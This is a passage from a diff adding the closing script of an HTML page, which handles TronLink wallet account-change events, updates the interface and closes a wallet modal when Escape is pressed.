+                        // Silent fail, try next wallet
+                    }
+                }
+            }
+        });
+
+        // Handle wallet events
+        if (window.tronLink) {
+            window.tronLink.on?.('accountsChanged', (accounts) => {
+                if (accounts.length === 0) {
+                    disconnectWallet();
+                } else {
+                    currentAddress = accounts[0];
+                    updateUI();
+                }
+            });
+        }
+
+        // Close modal on escape
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeWalletModal();
+        });
+    </script>
+</body>
+</html>
